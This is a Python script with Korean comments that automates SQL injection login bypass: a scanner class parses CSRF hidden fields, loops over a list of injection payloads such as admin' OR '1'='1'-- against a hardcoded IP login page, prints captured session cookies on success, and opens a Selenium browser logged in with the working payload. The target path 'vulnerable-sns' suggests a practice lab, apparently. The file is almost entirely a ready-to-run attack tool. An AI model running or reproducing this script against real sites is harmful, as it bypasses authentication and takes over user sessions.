import requests     #HTTP GET/POST 요청을 간편하게 보냄
from bs4 import BeautifulSoup       #HTML 문서에서 <input>같은 요소를 쉽게 파싱함
from urllib.error import URLError       #에러 예외 클래스를 불러옴 > GET/POST (네트워크) 오류 발생 > 던지기 위해 사용
import time     #sleep 대기할 때 사용
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import UnexpectedAlertPresentException

class AutoLoginScanner:     #클래스 정의
    def __init__(self, url,     #__init__ : 클래스로 객체를 만들 때 한 번 실행
                 username_field='username',     #<input name="..."> 사용자 이름 필드명
                 password_field='password'):
        """
        로그인 시도를 위한 초기화

        Args:
            url (str): 로그인 처리 URL (form action)
            username_field (str): 아이디 입력 필드명(name 속성)
            password_field (str): 비밀번호 입력 필드명(name 속성)
        """
        self.url = url
        self.username_field = username_field
        self.password_field = password_field        #전달받은 인스턴스 변수로 저장
        # 세션을 사용하면 쿠키를 이어받아 로그인 유지가 가능합니다.
        self.session = requests.Session()       #저장해서 한 번 로그인하면 쿠키가 세션에 남아 이후 요청에도 자동으로 포함

    def login(self, username, password,     #BF에 사용할 계정 정보
              extra_fields=None, headers=None, timeout=10):     #hidden input(CSRF Token 등) 수동 지정 / #user-agent 등 커스텀 http 헤더 / 최대 요청
        """
        실제 로그인 시도를 수행.

        Returns:
            resp (requests.Response): 로그인 시도 후 응답 객체
            success (bool): 성공 여부
        """
        # 1) 로그인 페이지 GET (CSRF 토큰 등 hidden 필드 파싱용)
        try:
            r = self.session.get(self.url, headers=headers, timeout=timeout)
        except requests.RequestException as e:
            raise URLError(f"[GET 실패] {e}")     #서버 오류 => 예외를 던짐

        # 2) 기본 payload 구성 (아이디/비번)
        payload = {
            self.username_field: username,
            self.password_field: password
        }

        # 3) hidden input 자동 파싱 (예: CSRF)
        soup = BeautifulSoup(r.text, 'html.parser')     #파싱 준비
        for hidden in soup.find_all('input', {'type': 'hidden'}):
            name = hidden.get('name')
            value = hidden.get('value', '')
            if name and name not in payload:
                payload[name] = value       #name, value를 읽어와서 같은 이름이 페이로드에 없으면 추가 -보통 CSRF Token 여기에 있음

        # 4) 추가 필드 병합 (필요 시)
        if extra_fields:
            payload.update(extra_fields)        #호출 시, 해당 인자를 줬으면 페이로드에 병합함

        # 5) 실제 로그인 POST
        try:
            resp = self.session.post(self.url,
                                     data=payload,
                                     headers=headers,
                                     timeout=timeout,
                                     allow_redirects=True)
        except requests.RequestException as e:
            raise URLError(f"[POST 실패] {e}")        #에러나면 전파

        # 6) 로그인 성공 여부 판단 (사이트별로 로직 수정 필요)
        success = False
        # - 리다이렉트가 발생했으면 성공일 가능성
        if resp.history and resp.status_code == 200:
            success = True
        # - 실패 키워드가 있으면 무조건 실패
        if "로그인 실패" in resp.text or "Invalid credentials" in resp.text:
            success = False
        # - 로그아웃 링크가 보이면 성공
        if "logout" in resp.text.lower() or "sign out" in resp.text.lower():
            success = True

        return resp, success

    ## 로그인 성공 후 실행할 것
def post_login_action(scanner):
    # 1) 로그인 후 보여줄 URL 지정
    next_url = "http://18.179.53.107/vulnerable-sns/www/index.php"

    # 2) 같은 세션으로 GET 요청
    try:
        resp = scanner.session.get(next_url, timeout=5)
    except Exception as e:
        print("▶ 다음 페이지 요청 중 에러:", e)
        return

    # 3) HTTP 상태 코드 확인
    if resp.status_code != 200:
        print("▶ 다음 페이지 로드 실패:", resp.status_code)
        return

    # 4) 페이지 콘텐츠 일부 출력 (또는 원하는 파싱/로직 수행)
    print("▶ 다음 페이지 로드 성공! 일부 HTML:")
    # 예: 앞 500자만 잘라서 보기
    print(resp.text[:500], "…")

    # 5) 필요하다면 BeautifulSoup로 파싱해서 특정 요소를 끄집어 올 수도 있습니다.
    soup = BeautifulSoup(resp.text, 'html.parser')
    # 예시: <h1> 태그 내용 출력
    h1 = soup.find('h1')
    if h1:
        print("페이지 제목:", h1.text.strip())

# ======================================================
# 1) 무차별 대입에 사용할 페이로드 리스트
PAYLOADS = [
    # (username, password, 설명)
    ("admin' OR '1'='1'--", "any",           "Classic OR 1=1"),
    ("admin'--",            "any",           "Comment Bypass"),
    ("admin'#",             "any",           "Hash Comment (MySQL)"),
    ("' OR 1=1--",          "any",           "Empty Username"),
    ("admin",               "' OR '1'='1",   "Password Field"),
    ("admin' OR 'a'='a'--", "any",           "OR a=a"),
    ("' OR 'x'='x'--",      "any",           "OR x=x"),
    ("admin'//OR//1=1--",   "any",           "Comment Space"),
]

def brute_force_login(scanner, headers=None, delay=0.5):
    """
    PAYLOADS 리스트를 순회하며 로그인 시도.
    성공하면 즉시 종료, 아니면 끝까지 반복.

    Args:
        scanner (AutoLoginScanner): 로그인 스캐너 인스턴스
        headers (dict): 공통 HTTP 헤더
        delay (float): 시도 간 대기 시간(초)
    """
    total = len(PAYLOADS)
    for idx, (user, pw, desc) in enumerate(PAYLOADS, 1):
        print(f"[{idx}/{total}] 시도: {desc}")
        print(f"    username = {user!r}")
        print(f"    password = {pw!r}")
        try:
            resp, ok = scanner.login(username=user,
                                     password=pw,
                                     headers=headers)

        except URLError as e:
            print("  ▶ 오류 발생:", e)
            continue

        if ok:
            print(f"  ▶ 로그인 성공! #{idx} 페이로드")

            open_browser_and_login(user, pw)

            print("    HTTP 상태코드:", resp.status_code)
            print("    세션 쿠키:", scanner.session.cookies.get_dict())

            ## 로그인 성공 시 자동으로 후속 액션 실행
            post_login_action(scanner)
            return True

        else:
            print("  ▶ 로그인 실패")

        time.sleep(delay)

    print("모든 페이로드 시도 완료: 로그인에 모두 실패했습니다.")
    return False
def open_browser_and_login(user, pw):
    # ChromeDriver 가 PATH 에 설정되어 있어야 합니다.
    driver = webdriver.Chrome()
    # 1) 로그인 페이지 이동
    driver.get("http://18.179.53.107/vulnerable-sns/www/login.php")
    # 2) 폼 필드에 아이디/비번 입력
    driver.find_element(By.NAME, "username").send_keys(user)
    driver.find_element(By.NAME, "password").send_keys(pw)
    # 3) 엔터키 또는 로그인 버튼 클릭
    driver.find_element(By.NAME, "password").send_keys(Keys.ENTER)
    time.sleep(2)  # 페이지 로딩 대기
     # index.php 로 이동하는데, 올라오는 alert 을 먼저 닫아 줘야 합니다.
    #
    # try:
    #     driver.get("http://18.179.53.107/vulnerable-sns/www/index.php")
    # except UnexpectedAlertPresentException:
    #  # alert 이 떠 있으면 닫고 재시도
    #     alert = driver.switch_to.alert
    #     alert.accept()
    #     driver.get("http://18.179.53.107/vulnerable-sns/www/index.php")


    try:
        driver.get("http://18.179.53.107/index.php")
        alert = driver.switch_to.alert
        print("자동으로 뜬 alert 창을 닫습니다 : ", alert.text)
        alert.accept()
    except UnexpectedAlertPresentException:
        pass


    print("✅ 브라우저에 로그인된 상태로 index.php 가 열렸습니다.")

# ======================================================
if __name__ == "__main__":
    # 실제 로그인 URL과 필드명으로 바꿔 주세요.
    LOGIN_URL       = "http://18.179.53.107/vulnerable-sns/www/login.php"
    USER_FIELD_NAME = "username"
    PASS_FIELD_NAME = "password"

    # 사용자 정의 HTTP 헤더 (선택)
    HEADERS = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
    }

    # 1) 스캐너 객체 생성
    scanner = AutoLoginScanner(
        url=LOGIN_URL,
        username_field=USER_FIELD_NAME,
        password_field=PASS_FIELD_NAME
    )

    # 2) brute-force 로그인 시도
    brute_force_login(scanner, headers=HEADERS, delay=0.3)

input()